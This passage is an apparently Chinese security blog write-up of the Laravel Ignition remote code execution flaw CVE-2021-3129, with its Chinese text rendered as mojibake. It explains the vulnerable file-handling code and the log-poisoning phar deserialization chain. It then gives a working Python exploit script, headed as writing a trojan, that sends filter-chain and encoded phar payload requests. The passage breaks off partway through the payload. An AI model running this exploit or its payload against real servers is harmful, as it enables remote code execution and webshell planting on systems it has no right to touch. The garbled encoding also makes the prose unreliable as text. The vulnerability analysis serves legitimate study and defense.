ˆä¿¡æ¯ã€‚ignitionä½œä¸ºLaravelçš„è°ƒè¯•å·¥å…·ï¼Œå®ƒä¸ä»…ç¾åŒ–äº†é”™è¯¯å †æ ˆä¿¡æ¯ï¼Œè¿˜æä¾›äº†ä¸€äº›è§£å†³æ–¹æ¡ˆï¼ˆsolutionsï¼‰ï¼Œå…è®¸å¼€å‘è€…é€šè¿‡ç‚¹å‡»æŒ‰é’®å¿«é€Ÿä¿®å¤ä¸€äº›é”™è¯¯ã€‚</p><p>åœ¨<code>vendor\facade\ignition\src\Solutions</code>ç›®å½•ä¸‹ï¼ŒIgnitionç»„ä»¶æä¾›çš„è§£å†³æ–¹æ¡ˆï¼ˆsolutionsï¼‰åŒ…æ‹¬ï¼ˆéƒ¨åˆ†ï¼‰ï¼š</p><ol><li><code>GenerateAppKeySolution.php</code>ï¼šç”¨äºç”Ÿæˆåº”ç”¨ç¨‹åºçš„åŠ å¯†å¯†é’¥ã€‚</li><li><code>RunMigrationsSolution.php</code>ï¼šç”¨äºè¿è¡Œæ•°æ®åº“è¿ç§»ã€‚</li><li><code>SuggestUsingCorrectDbNameSolution.php</code>ï¼šå»ºè®®ä½¿ç”¨æ­£ç¡®çš„æ•°æ®åº“åç§°ã€‚</li><li><code>LivewireDiscoverSolution.php</code>ï¼šä¸Livewireæ¡†æ¶ç›¸å…³çš„è§£å†³æ–¹æ¡ˆã€‚</li><li><code>SolutionTransformer.php</code>ï¼šç”¨äºè½¬æ¢è§£å†³æ–¹æ¡ˆçš„ç±»ã€‚</li><li><code>UseDefaultValetDbCredentialsSolution.php</code>ï¼šä½¿ç”¨é»˜è®¤çš„Valetæ•°æ®åº“å‡­è¯ã€‚</li><li><code>MakeViewVariableOptionalSolution.php</code>ï¼šä½¿è§†å›¾å˜é‡å¯é€‰çš„è§£å†³æ–¹æ¡ˆã€‚</li></ol><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2011.27.00.png" style="zoom:40%;"><h2 id="3-2-æ¼æ´æˆå› "><a href="#3-2-æ¼æ´æˆå› " class="headerlink" title="3.2 æ¼æ´æˆå› "></a>3.2 æ¼æ´æˆå› </h2><h3 id="3-2-1-Laravelå¦‚ä½•è°ƒç”¨solution"><a href="#3-2-1-Laravelå¦‚ä½•è°ƒç”¨solution" class="headerlink" title="3.2.1 Laravelå¦‚ä½•è°ƒç”¨solution"></a>3.2.1 Laravelå¦‚ä½•è°ƒç”¨solution</h3><p>solutionçš„æ§åˆ¶å™¨ä¸­ï¼ˆvendor\facade\ignition\src\Http\Controllers\ExecuteSolutionController.phpï¼‰,åœ¨ExecuteSolutionControllerä¸­ä¼šå»è°ƒç”¨å¯¹åº”solutionçš„runæ–¹æ³•å¹¶ä¼ å…¥å‚æ•°parametersï¼Œè€Œè¿™ä¸ªå‚æ•°æ˜¯æŠ“åŒ…æ—¶è¯·æ±‚æ­£æ–‡ä¸­çš„parametersï¼Œæ‰€ä»¥è¿™ä¸ªè¾“å…¥å‚æ•°æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Facade<span class="token punctuation">\</span>Ignition<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Controllers</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Facade<span class="token punctuation">\</span>Ignition<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Requests<span class="token punctuation">\</span>ExecuteSolutionRequest</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Facade<span class="token punctuation">\</span>IgnitionContracts<span class="token punctuation">\</span>SolutionProviderRepository</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Validation<span class="token punctuation">\</span>ValidatesRequests</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ExecuteSolutionController</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">ValidatesRequests</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span>        <span class="token class-name type-declaration">ExecuteSolutionRequest</span> <span class="token variable">$request</span><span class="token punctuation">,</span>        <span class="token class-name type-declaration">SolutionProviderRepository</span> <span class="token variable">$solutionProviderRepository</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$solution</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getRunnableSolution</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$solution</span><span class="token operator">-&gt;</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'parameters'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è°ƒç”¨å¯¹åº”solutionå¯¹è±¡çš„run()æ–¹æ³•ï¼Œå¹¶ä¼ å…¥å‚æ•°parameters</span>        <span class="token keyword">return</span> <span class="token function">response</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-2-MakeViewVariableOptionalSolution-phpçš„run-æ–¹æ³•"><a href="#3-2-2-MakeViewVariableOptionalSolution-phpçš„run-æ–¹æ³•" class="headerlink" title="3.2.2 MakeViewVariableOptionalSolution.phpçš„run()æ–¹æ³•"></a>3.2.2 MakeViewVariableOptionalSolution.phpçš„run()æ–¹æ³•</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Facade<span class="token punctuation">\</span>Ignition<span class="token punctuation">\</span>Solutions</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Facade<span class="token punctuation">\</span>IgnitionContracts<span class="token punctuation">\</span>RunnableSolution</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Support<span class="token punctuation">\</span>Facades<span class="token punctuation">\</span>Blade</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">MakeViewVariableOptionalSolution</span> <span class="token keyword">implements</span> <span class="token class-name">RunnableSolution</span><span class="token punctuation">{</span>    <span class="token operator">...</span><span class="token operator">...</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$parameters</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">makeOptional</span><span class="token punctuation">(</span><span class="token variable">$parameters</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$output</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">// å°†makeOptional()æ–¹æ³•çš„ç»“æœè¾“å‡ºå¯¹åº”æ–‡ä»¶ä¸­ï¼ˆviewFileå‚æ•°æŒ‡å®šï¼‰</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$parameters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'viewFile'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">makeOptional</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$parameters</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment">// è°ƒç”¨file_get_contentsæ–¹æ³•å°†ä¼ å…¥çš„å‚æ•°ä½œä¸ºè·¯å¾„è¯»å–æ–‡ä»¶å†…å®¹ï¼Œç”¨$originalContentså­˜å‚¨ï¼Œä½œä¸ºåŸå§‹å†…å®¹</span>        <span class="token variable">$originalContents</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$parameters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'viewFile'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// å¤„ç†è¯»å–çš„å†…å®¹ï¼Œè‹¥æ–‡ä»¶å†…å®¹ä¸­å­˜åœ¨â€˜$variableNamedçš„å€¼â€™ï¼Œåˆ™æ›¿æ¢ä¸ºâ€˜$variableNamedçš„å€¼??â€™ï¼Œå°†å¤„ç†åçš„å†…å®¹ä½¿ç”¨$newContentså­˜å‚¨ï¼Œä½œä¸ºæ–°çš„å†…å®¹</span>        <span class="token variable">$newContents</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$'</span><span class="token operator">.</span><span class="token variable">$parameters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'variableName'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'$'</span><span class="token operator">.</span><span class="token variable">$parameters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'variableName'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" ?? ''"</span><span class="token punctuation">,</span> <span class="token variable">$originalContents</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ä»¥ä¸‹ä»£ç ä¸ºå¤„ç†åŸå§‹å†…å®¹ä¸æ–°å†…å®¹</span>        <span class="token variable">$originalTokens</span> <span class="token operator">=</span> <span class="token function">token_get_all</span><span class="token punctuation">(</span><span class="token class-name static-context">Blade</span><span class="token operator">::</span><span class="token function">compileString</span><span class="token punctuation">(</span><span class="token variable">$originalContents</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$newTokens</span> <span class="token operator">=</span> <span class="token function">token_get_all</span><span class="token punctuation">(</span><span class="token class-name static-context">Blade</span><span class="token operator">::</span><span class="token function">compileString</span><span class="token punctuation">(</span><span class="token variable">$newContents</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$expectedTokens</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">generateExpectedTokens</span><span class="token punctuation">(</span><span class="token variable">$originalTokens</span><span class="token punctuation">,</span> <span class="token variable">$parameters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'variableName'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// åªè¦åŸå§‹å†…å®¹ä¸­ä¸å«â€˜$variableNamedçš„å€¼â€™ï¼Œ$originalContentsä¸$newContentsçš„å€¼ä¼šç›¸åŒï¼Œé‚£ä¹ˆä¸‹æ–¹çš„åˆ¤æ–­æ¡ä»¶ä¸ä¼šæˆç«‹ï¼Œå°±ä¸ä¼šè¿”å›false</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$expectedTokens</span> <span class="token operator">!==</span> <span class="token variable">$newTokens</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$newContents</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨<code>run</code>æ–¹æ³•ä¸­ï¼Œ<code>makeOptional()</code>å‡½æ•°è¢«ç”¨æ¥å¤„ç†è¾“å…¥çš„å‚æ•°ã€‚è¿™ä¸ªæ–¹æ³•é¦–å…ˆä¼šæ‰§è¡Œ<code>file_get_contents()</code>å‡½æ•°ã€‚å› ä¸ºæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶<code>$parameters['viewFile']</code>è¿™ä¸ªå˜é‡ï¼Œå¦‚æœèƒ½å¤Ÿè¿›ä¸€æ­¥å°†æ¶æ„çš„pharæ–‡ä»¶ä¸Šä¼ æˆ–å†™å…¥åˆ°æœåŠ¡å™¨ä¸Šï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨<code>file_get_contents()</code>å‡½æ•°è§¦å‘pharæ–‡ä»¶çš„ååºåˆ—åŒ–ï¼Œè¿›è€Œå®ç°æ”»å‡»ã€‚</p><p>æˆ‘ä»¬è¿˜å¯ä»¥ä»makeOptional()æ–¹æ³•å‰©ä¸‹çš„ä»£ç ä¸­å‘ç°ï¼Œå½“file_get_contents()è·å–åˆ°çš„æ–‡ä»¶å†…å®¹ä¸­ä¸å«â€˜$variableNamedçš„å€¼â€™æ—¶ï¼Œåˆ™ä¸€å®šä¼šè¿”å›è¯»å–çš„æ–‡ä»¶å†…å®¹ã€‚è€Œæ¥ç€åœ¨run()æ–¹æ³•ä¸­ä¼šè°ƒç”¨file_put_contents()æ–¹æ³•å°†makeOptional()æ–¹æ³•è¿”å›çš„ç»“æœï¼ˆè¯»å–çš„æ–‡ä»¶å†…å®¹ï¼‰åˆé‡æ–°è¾“å‡ºåˆ°åŸæ–‡ä»¶ä¸­ã€‚</p><ol><li><strong>æ¼æ´æˆå› </strong>ï¼šæ¼æ´ä¸»è¦æˆå› æ˜¯Ignitionç»„ä»¶ä¸­<code>MakeViewVariableOptionalSolution</code>ç±»çš„å‚æ•°è¿‡æ»¤ä¸ä¸¥è°¨ã€‚åœ¨<code>MakeViewVariableOptionalSolution</code>çš„<code>run</code>æ–¹æ³•ä¸­ï¼Œä½¿ç”¨äº†<code>file_get_contents()</code>å’Œ<code>file_put_contents()</code>å‡½æ•°ï¼Œè¿™äº›å‡½æ•°å¯ä»¥è¯»å–å’Œå†™å…¥æ–‡ä»¶ï¼Œä½†æ˜¯æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œå……åˆ†çš„éªŒè¯å’Œæ¸…ç†ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æ§åˆ¶è¿™äº›è¾“å…¥æ¥æ‰§è¡Œæ¶æ„æ“ä½œã€‚</li><li><strong>æ¼æ´è§¦å‘</strong>ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹å®šçš„POSTè¯·æ±‚åˆ°<code>/_ignition/execute-solution</code>è·¯ç”±ï¼Œåˆ©ç”¨<code>MakeViewVariableOptionalSolution</code>è§£å†³æ–¹æ¡ˆï¼Œé€šè¿‡æ§åˆ¶<code>parameters</code>å‚æ•°æ¥è§¦å‘æ¼æ´ã€‚</li></ol><h2 id="3-3-æ¼æ´åˆ©ç”¨æ€è·¯"><a href="#3-3-æ¼æ´åˆ©ç”¨æ€è·¯" class="headerlink" title="3.3 æ¼æ´åˆ©ç”¨æ€è·¯"></a>3.3 æ¼æ´åˆ©ç”¨æ€è·¯</h2><p>Laravelè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-3129ï¼‰åˆ©ç”¨æ—¥å¿—æ–‡ä»¶è¿›è¡Œæ”»å‡»çš„åŸç†å¯ä»¥æ¦‚æ‹¬å¦‚ä¸‹ï¼š</p><ol><li><strong>Debugæ¨¡å¼å¼€å¯</strong>ï¼šå½“Laravelæ¡†æ¶å¼€å¯Debugæ¨¡å¼æ—¶ï¼ŒIgnitionç»„ä»¶ä¼šæä¾›è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯å’Œè§£å†³æ–¹æ¡ˆã€‚</li><li><strong>Ignitionç»„ä»¶çš„ä¸å®‰å…¨ä½¿ç”¨</strong>ï¼šIgnitionç»„ä»¶ä¸­çš„<code>MakeViewVariableOptionalSolution</code>ç±»åœ¨å¤„ç†ä¼ å…¥çš„å‚æ•°æ—¶ï¼Œä¼šè°ƒç”¨<code>file_get_contents()</code>æ–¹æ³•è¯»å–ä¸€ä¸ªç”±å¤–éƒ¨å‚æ•°æŒ‡å®šçš„æ–‡ä»¶å†…å®¹ï¼Œè¿™ä¸ªæ–‡ä»¶è·¯å¾„æ˜¯å¯æ§çš„ã€‚</li><li><strong>æ—¥å¿—æ–‡ä»¶çš„åˆ©ç”¨</strong>ï¼šæ”»å‡»è€…æ— æ³•ç›´æ¥ä¸Šä¼ pharæ–‡ä»¶æ—¶ï¼Œå¯ä»¥åˆ©ç”¨Laravelçš„æ—¥å¿—æ–‡ä»¶<code>laravel.log</code>æ¥è¿›è¡Œæ”»å‡»ã€‚è¿™ä¸ªæ—¥å¿—æ–‡ä»¶è®°å½•äº†Laravelçš„æŠ¥é”™ä¿¡æ¯ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„è¯·æ±‚ï¼Œä½¿å¾—é”™è¯¯ä¿¡æ¯ä¸­åŒ…å«æ”»å‡»è€…æ§åˆ¶çš„å†…å®¹ï¼Œä»è€Œå°†<code>laravel.log</code>æ–‡ä»¶å˜ä¸ºä¸€ä¸ªåˆæ³•çš„pharæ–‡ä»¶è¿›è¡Œåˆ©ç”¨ã€‚</li><li><strong>æ—¥å¿—æ–‡ä»¶æ ¼å¼</strong>ï¼š<code>laravel.log</code>æ–‡ä»¶ä¸­çš„é”™è¯¯ä¿¡æ¯æ ¼å¼å…è®¸æ”»å‡»è€…é€šè¿‡æ§åˆ¶<code>viewFile</code>çš„å€¼ï¼Œé…åˆ<code>makeOptional()</code>æ–¹æ³•ä¸­çš„<code>file_get_contents()</code>å’Œ<code>file_put_contents()</code>æ–¹æ³•ï¼Œå°†æ—¥å¿—æ–‡ä»¶æ”¹é€ æˆä¸€ä¸ªpharæ–‡ä»¶ã€‚</li><li><strong>Pharæ–‡ä»¶çš„å¤´éƒ¨</strong>ï¼šä¸€ä¸ªæ–‡ä»¶æ˜¯å¦æ˜¯pharæ–‡ä»¶çš„æ ‡å‡†æ˜¯å…¶æ˜¯å¦æºå¸¦äº†pharæ–‡ä»¶çš„å¤´éƒ¨ã€‚æ”»å‡»è€…é€šè¿‡æ§åˆ¶æ—¥å¿—æ–‡ä»¶ä¸­è¾“å‡ºçš„å†…å®¹ï¼Œå¯ä»¥å®ŒæˆRCEæ¼æ´åˆ©ç”¨ã€‚</li><li><strong>æ¸…ç©ºæ—¥å¿—æ–‡ä»¶</strong>ï¼šæ”»å‡»è€…é¦–å…ˆéœ€è¦æ¸…ç©ºæ—¥å¿—æ–‡ä»¶ï¼Œä»¥ä¾¿å†™å…¥æ¶æ„çš„pharæ–‡ä»¶å†…å®¹ã€‚</li><li><strong>å†™å…¥æ¶æ„å†…å®¹</strong>ï¼šæ”»å‡»è€…é€šè¿‡å‘é€ç‰¹å®šçš„POSTè¯·æ±‚ï¼Œå°†æ¶æ„çš„pharæ–‡ä»¶å†…å®¹å†™å…¥<code>laravel.log</code>æ–‡ä»¶ä¸­ï¼Œåˆ©ç”¨ç¼–ç è½¬æ¢ï¼ˆå¦‚<code>convert.quoted-printable-decode</code>ã€<code>convert.iconv.utf-16le.utf-8</code>ã€<code>convert.base64-decode</code>ï¼‰æ¸…é™¤å†…å®¹ã€‚</li><li><strong>è§¦å‘Pharååºåˆ—åŒ–</strong>ï¼šæœ€åï¼Œæ”»å‡»è€…é€šè¿‡<code>phar://</code>åè®®è§¦å‘pharæ–‡ä»¶çš„ååºåˆ—åŒ–ï¼Œæ‰§è¡Œä»»æ„ä»£ç ï¼Œå®Œæˆè¿œç¨‹ä»£ç æ‰§è¡Œæ”»å‡»ã€‚</li></ol><p>æ€»ç»“æ¥è¯´ï¼ŒCVE-2021-3129æ¼æ´åˆ©ç”¨äº†Ignitionç»„ä»¶å¯¹æ–‡ä»¶æ“ä½œçš„ä¸å®‰å…¨ä½¿ç”¨ï¼Œç»“åˆLaravelæ—¥å¿—æ–‡ä»¶çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ ç‰¹å®šçš„è¯·æ±‚å’Œå“åº”ï¼Œå°†æ—¥å¿—æ–‡ä»¶è½¬æ¢ä¸ºæ¶æ„çš„pharæ–‡ä»¶ï¼Œæœ€ç»ˆå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><h1 id="å››ã€EXP"><a href="#å››ã€EXP" class="headerlink" title="å››ã€EXP"></a>å››ã€EXP</h1><h2 id="4-1-exp1-å†™å…¥å¤æ‚æœ¨é©¬"><a href="#4-1-exp1-å†™å…¥å¤æ‚æœ¨é©¬" class="headerlink" title="4.1 exp1-å†™å…¥å¤æ‚æœ¨é©¬"></a>4.1 exp1-å†™å…¥å¤æ‚æœ¨é©¬</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*- </span><span class="token keyword">import</span> requests<span class="token punctuation">,</span>json<span class="token keyword">import</span> sys<span class="token punctuation">,</span>reproxies <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"http"</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1:8080'</span><span class="token punctuation">}</span> header<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span><span class="token string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0"</span><span class="token punctuation">,</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span><span class="token string">"application/json"</span><span class="token punctuation">}</span>  <span class="token keyword">def</span> <span class="token function">clearlog</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>  <span class="token string">"variableName"</span><span class="token punctuation">:</span><span class="token string">"username"</span><span class="token punctuation">,</span><span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>     req<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span>indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> req <span class="token keyword">def</span> <span class="token function">AA</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token punctuation">{</span> <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>  <span class="token string">"variableName"</span><span class="token punctuation">:</span><span class="token string">"username"</span><span class="token punctuation">,</span><span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"AA"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>    req<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span>indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> req <span class="token keyword">def</span> <span class="token function">sendpayloadwindows</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token punctuation">{</span> <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>  <span class="token string">"variableName"</span><span class="token punctuation">:</span><span class="token string">"username"</span><span class="token punctuation">,</span><span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=71=00=2F=00=42=00=77=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=6F=00=42=00=77=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=32=00=4E=00=44=00=45=00=36=00=49=00=6D=00=56=00=6A=00=61=00=47=00=38=00=67=00=58=00=6A=00=77=00=2F=00=63=00=47=00=68=00=77=00=49=00=48=00=4E=00=6C=00=63=00=33=00=4E=00=70=00=62=00=32=00=35=00=66=00=63=00=33=00=52=00=68=00=63=00=6E=00=51=00=6F=00=4B=00=54=00=74=00=41=00=63=00=32=00=56=00=30=00=58=00=33=00=52=00=70=00=62=00=57=00=56=00=66=00=62=00=47=00=6C=00=74=00=61=00=58=00=51=00=6F=00=4D=00=43=00=6B=00=37=00=51=00=47=00=56=00=79=00=63=00=6D=00=39=00=79=00=58=00=33=00=4A=00=6C=00=63=00=47=00=39=00=79=00=64=00=47=00=6C=00=75=00=5A=00=79=00=67=00=77=00=4B=00=54=00=74=00=6D=00=64=00=5